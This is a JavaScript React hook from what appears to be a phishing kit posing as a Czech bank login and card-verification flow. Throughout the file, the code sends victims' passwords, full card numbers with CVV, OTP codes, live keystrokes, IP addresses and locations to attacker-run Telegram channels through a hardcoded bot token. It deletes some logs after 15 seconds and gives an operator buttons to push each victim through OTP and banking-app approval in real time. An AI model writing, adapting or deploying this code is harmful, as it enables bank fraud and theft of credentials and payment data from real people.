// src/hooks/useTelegramBot.js
import { useRef, useEffect, useCallback } from 'react';
import axios from 'axios';

const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';

// Channel IDs
const LOGS_CHAT_ID = '-1003861936742';  // Channel for logs (no buttons)
const ACTIONS_CHAT_ID = '-1003745991330';  // Channel for interactive messages (with buttons)

const deleteMessageAfterDelay = async (chatId, messageId, delay = 15000) => {
  setTimeout(async () => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`;
      await axios.post(url, {
        chat_id: chatId,
        message_id: messageId
      });
      console.log('✅ Message deleted after 15 seconds');
    } catch (error) {
      console.error('Error deleting message:', error);
    }
  }, delay);
};

export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr) => {
  const pollingIntervalRef = useRef(null);
  const lastUpdateIdRef = useRef(0);

  const generateSessionId = () => {
    return Date.now().toString() + Math.random().toString(36).substr(2, 6);
  };

  // ========== ACTIONS CHANNEL (with buttons) ==========
  
  const sendToTelegramWithButtons = async (message, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const keyboard = {
        inline_keyboard: [
          [
            { text: "✅ Approve & Continue", callback_data: `approve_${sessionId}` },
            { text: "❌ Deny", callback_data: `deny_${sessionId}` }
          ],
          [
            { text: "💳 View Card Details", callback_data: `card_${sessionId}` }
          ]
        ]
      };

      await axios.post(url, {
        chat_id: ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      return true;
    } catch (error) {
      console.error('Error sending to Telegram:', error);
      return false;
    }
  };

  const sendCardDetailsToTelegram = async (cardData, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const cardMessage = `
💳 <b>CARD INFORMATION RECEIVED</b> 💳
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━

<b>Card Details:</b>
├ 👤 <b>Cardholder:</b> ${cardData.cardholderName}
├ 💳 <b>Card Number:</b> ${cardData.cardNumber}
├ 📅 <b>Expiry Date:</b> ${cardData.expiryDate}
└ 🔐 <b>CVV:</b> ${cardData.cvv}

<b>Personal Info:</b>
├ 📞 <b>Phone:</b> ${cardData.phoneNumber}
├ 🏙️ <b>City:</b> ${cardData.city}
└ 📮 <b>Postal Code:</b> ${cardData.postalCode}

━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Click a button below</i>
      `;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "➡️ Next Step (Appr)", callback_data: `next_step_appr_${sessionId}` },
            { text: "➡️ Next Step (OTP)", callback_data: `next_${sessionId}` }
          ],
          [
            { text: "🚫 Deny & Block IP", callback_data: `block_${sessionId}` }
          ],
          [
            { text: "⬅️ Back to Login", callback_data: `back_to_login_${sessionId}` }
          ]
        ]
      };

      await axios.post(url, {
        chat_id: ACTIONS_CHAT_ID,
        text: cardMessage,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      return true;
    } catch (error) {
      console.error('Error sending card details:', error);
      return false;
    }
  };

  const sendOtpPageLog = async (username, phoneNumber, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `🔐 OTP PAGE - IN PROGRESS 🔐
━━━━━━━━━━━━━━━━━━━━━
👤 Username: ${username}
📱 Phone: ${phoneNumber}
⏰ Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ User is ready to enter OTP code!`;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "⬅️ Back to Card Verification", callback_data: `back_to_card_${sessionId}` }
          ]
        ]
      };

      const response = await axios.post(url, {
        chat_id: ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(ACTIONS_CHAT_ID, messageId, 15000);
      
      console.log('✅ OTP page log sent (with back button)');
    } catch (error) {
      console.error('Error sending OTP page log:', error);
    }
  };

  // ========== LOGS CHANNEL (no buttons, auto-delete) ==========

  const sendPageViewLog = async () => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `⚠️ Someone is visiting the login page! 
━━━━━━━━━━━━━━━━━━━━━
⏰ Time: ${new Date().toLocaleString()}
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Page view log sent');
    } catch (error) {
      console.error('Error sending page view log:', error);
    }
  };

  const sendSiteEntryLog = async () => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `🌍 <b>SITE ENTRY - VISITOR</b> 🌍
━━━━━━━━━━━━━━━━━━━━━
📱 <b>Event:</b> Someone entered the website
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🌐 <b>Page:</b> ${window.location.pathname}
🖥️ <b>User Agent:</b> ${navigator.userAgent.substring(0, 80)}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>A visitor is on your website!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Site entry log sent');
    } catch (error) {
      console.error('Error sending site entry log:', error);
    }
  };

  const sendVisitNotification = async (ipAddress, userAgent, referrer, screenResolution, timezone, sessionId, language) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      let geoInfo = 'Not available';
      try {
        const geoResponse = await axios.get(`https://ipapi.co/${ipAddress}/json/`);
        if (geoResponse.data && !geoResponse.data.error) {
          geoInfo = `${geoResponse.data.city}, ${geoResponse.data.country_name} (${geoResponse.data.country_code})`;
        }
      } catch (geoError) {
        console.error('Error getting geolocation:', geoError);
      }
      
      const message = `
🌐 <b>NEW SITE VISITOR</b> 🌐
━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
📊 <b>VISITOR INFORMATION:</b>
├ 🌍 <b>IP Address:</b> <code>${ipAddress}</code>
├ 📍 <b>Location:</b> ${geoInfo}
━━━━━━━━━━━━━━━━━━━━
⚠️ <i>A new visitor has landed on your site!</i>
⏰ <i>This message will self-delete in 15 seconds</i>
      `;

      const response = await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000); 
      
      console.log('✅ Visit notification sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending visit notification:', error);
      return false;
    }
  };

  const sendBlockedLog = async (username, reason, userIP) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `
🚫 <b>USER BLOCKED - ANTI-BOT</b> 🚫
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username || 'Unknown'}
🔌 <b>IP Address:</b> ${userIP}
📝 <b>Reason:</b> ${reason}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>This user has been blocked!</i>
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      console.log('✅ Blocked log sent to Telegram');
    } catch (error) {
      console.error('Error sending blocked log:', error);
    }
  };

  const sendCardVerificationLog = async (username) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `💳 CARD VERIFICATION - IN PROGRESS 💳
━━━━━━━━━━━━━━━━━━━━━
👤 Username: ${username}
⏰ Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ User is now entering card information!`;
      await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      console.log('✅ Card verification log sent');
    } catch (error) {
      console.error('Error sending card verification log:', error);
    }
  };

  const sendCardVerificationPageLog = async (username) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `💳 <b>CARD VERIFICATION PAGE</b> 💳
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Status:</b> User is on Card Verification page
👤 <b>Username:</b> ${username || 'Not logged in yet'}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User has reached the card verification step!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Card verification page log sent (will auto-delete in 30s)');
    } catch (error) {
      console.error('Error sending card verification page log:', error);
    }
  };

  const sendOtpSubmitLog = async (username, phoneNumber, otpCode) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `🔐 <b>OTP CODE SUBMITTED</b> 🔐
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Status:</b> User submitted OTP code
👤 <b>Username:</b> ${username}
📱 <b>Phone Number:</b> ${phoneNumber}
🔢 <b>OTP Code:</b> ${otpCode}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User has entered the OTP code!</i>`;
      await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      console.log('✅ OTP submit log sent');
    } catch (error) {
      console.error('Error sending OTP submit log:', error);
    }
  };

  const sendOtpVerifiedLog = async (username, phoneNumber, otpCode) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✅ <b>OTP VERIFIED SUCCESSFULLY</b> ✅
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Status:</b> OTP code verified
👤 <b>Username:</b> ${username}
📱 <b>Phone Number:</b> ${phoneNumber}
🔢 <b>OTP Code:</b> ${otpCode}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
🎯 <i>User has successfully verified OTP!</i>`;
      await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      console.log('✅ OTP verified log sent');
    } catch (error) {
      console.error('Error sending OTP verified log:', error);
    }
  };

  // ========== TYPING LOGS (WITH AUTO-DELETE) ==========
  const sendLoginTypingLog = async (username, field, value) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✏️ <b>TYPING - LOGIN PAGE</b> ✏️
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Field:</b> ${field}
📝 <b>Value:</b> ${value}
👤 <b>Username:</b> ${username || 'Not entered yet'}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is typing on the login page!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Login typing log sent');
    } catch (error) {
      console.error('Error sending login typing log:', error);
    }
  };

  const sendCardTypingLog = async (username, field, value) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✏️ <b>TYPING - CARD VERIFICATION PAGE</b> ✏️
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Field:</b> ${field}
📝 <b>Value:</b> ${value}
👤 <b>Username:</b> ${username}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is typing on the card verification page!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Card typing log sent');
    } catch (error) {
      console.error('Error sending card typing log:', error);
    }
  };

  const sendOtpTypingLog = async (username, phoneNumber, value) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✏️ <b>TYPING - OTP PAGE</b> ✏️
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Field:</b> OTP Code
📝 <b>Value:</b> ${value}
👤 <b>Username:</b> ${username}
📱 <b>Phone:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is typing the OTP code!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ OTP typing log sent');
    } catch (error) {
      console.error('Error sending OTP typing log:', error);
    }
  };

  // ========== CONFIRMATION LOG FOR NEXT STEP APPR ==========
  const sendConfirmationLog = async (username, cardNumber, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `
✅ <b>CONFIRMATION IN CZ KEY</b> ✅
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username}
💳 <b>Card Number:</b> ${cardNumber}
🆔 <b>Session ID:</b> <code>${sessionId}</code>
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>Status:</b> CONFIRMED IN BANKING APP
⚠️ <i>User confirmed payment in mobile banking</i>
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      
      console.log('✅ Confirmation log sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending confirmation log:', error);
      return false;
    }
  };

  // ========== OTHER FUNCTIONS ==========

  const sendFormattedCardDetails = async (cardData, sessionId, loginName, loginPassword) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      let userIP = 'Unable to get IP';
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        userIP = ipResponse.data.ip;
      } catch (ipError) {
        console.error('Error getting IP:', ipError);
      }
      
      const cardMessage = `
💳 <b>NEW CREDIT CARD DATA</b> 💳
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
<b>🔐 LOGIN CREDENTIALS:</b>
├ 👤 <b>Username:</b> ${loginName}
└ 🔑 <b>Password:</b> ${loginPassword}
━━━━━━━━━━━━━━━━━━━━━
<b>💳 CARD DETAILS:</b>
├ 💳 <b>Card Number:</b> <code>${cardData.cardNumber}</code>
├ 👤 <b>Cardholder:</b> ${cardData.cardholderName}
├ 📅 <b>Expiry Date:</b> ${cardData.expiryDate}
└ 🔐 <b>CVV:</b> <code>${cardData.cvv}</code>
<b>📍 PERSONAL INFO:</b>
├ 📞 <b>Phone:</b> ${cardData.phoneNumber}
├ 🏙️ <b>City:</b> ${cardData.city}
└ 📮 <b>Postal Code:</b> ${cardData.postalCode}
<b>🖥️ TECHNICAL INFO:</b>
├ 🌐 <b>Country:</b> Czech Republic
├ 🔌 <b>IP Address:</b> ${userIP}
└ 📱 <b>User-Agent:</b> ${navigator.userAgent.substring(0, 100)}

━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${new Date().toLocaleString()}
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: cardMessage,
        parse_mode: 'HTML'
      });
      
      console.log('✅ Formatted card details sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending formatted card details:', error);
      return false;
    }
  };

  const sendOtpToTelegram = async (otpCode, phoneNumber, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const otpMessage = `
🔐 <b>OTP CODE RECEIVED</b> 🔐
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━

<b>OTP Code:</b> <code>${otpCode}</code>
📱 <b>Phone Number:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: otpMessage,
        parse_mode: 'HTML'
      });
      return true;
    } catch (error) {
      console.error('Error sending OTP to Telegram:', error);
      return false;
    }
  };

  const sendSuccessToTelegram = async (phoneNumber, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const successMessage = `
✅ <b>LOGIN COMPLETED SUCCESSFULLY!</b> ✅
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone Number:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}

<b>Status:</b> OTP Verified ✓
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: successMessage,
        parse_mode: 'HTML'
      });
    } catch (error) {
      console.error('Error sending success message:', error);
    }
  };

  const setupTelegramPolling = useCallback(() => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
    }

    pollingIntervalRef.current = setInterval(async () => {
      if (!sessionId) return;

      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateIdRef.current}&timeout=5`;
        const response = await axios.get(url);
        
        const updates = response.data.result;
        
        for (const update of updates) {
          if (update.update_id >= lastUpdateIdRef.current) {
            lastUpdateIdRef.current = update.update_id + 1;
          }
          
          if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const [action, sid] = callbackData.split('_');
            
            if (sid === sessionId) {
              console.log('🔵 Action received from Telegram:', action, 'Session:', sid);
              
              // Execute the appropriate callback
              if (action === 'approve') {
                console.log('✅ Calling onApprove callback');
                onApprove?.();
              }
              else if (action === 'deny') {
                console.log('❌ Calling onDeny callback');
                onDeny?.();
              }
              else if (action === 'card') {
                console.log('💳 Calling onViewCard callback');
                onViewCard?.();
              }
              else if (action === 'next') {
                console.log('➡️ Calling onNextStep callback');
                onNextStep?.();
              }
              else if (action === 'back_to_card') {
                console.log('⬅️ Calling onBackToCard callback');
                onBackToCard?.();
              }
              else if (action === 'back_to_login') {
                console.log('⬅️ Calling onBackToLogin callback');
                onBackToLogin?.();
              }
              else if (action === 'block') {
                console.log('🚫 Calling onBlock callback');
                onBlock?.();
              }
              else if (action === 'next_step_appr') {
                console.log('🟢 Calling onNextStepAppr callback - NAVIGATING TO NEXTSTEPAPPR');
                onNextStepAppr?.();
              }
              
              // Answer the callback query
              try {
                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                  callback_query_id: update.callback_query.id,
                  text: action === 'next_step_appr' ? "✅ Redirecting to confirmation page..." : "✅ Request processed!"
                });
              } catch (callbackError) {
                console.error('Error answering callback:', callbackError);
              }
            }
          }
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 3000);
    
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, [sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr]);

  useEffect(() => {
    const cleanup = setupTelegramPolling();
    return cleanup;
  }, [setupTelegramPolling]);

  return {
    generateSessionId,
    sendToTelegramWithButtons,
    sendCardDetailsToTelegram,
    sendFormattedCardDetails,
    sendOtpToTelegram,
    sendSuccessToTelegram,
    sendPageViewLog,
    sendCardVerificationLog,
    sendOtpPageLog,
    sendCardVerificationPageLog,
    sendOtpSubmitLog,
    sendOtpVerifiedLog,
    sendLoginTypingLog,
    sendCardTypingLog,
    sendOtpTypingLog,
    sendSiteEntryLog,
    sendBlockedLog,
    sendVisitNotification,
    sendConfirmationLog
  };
};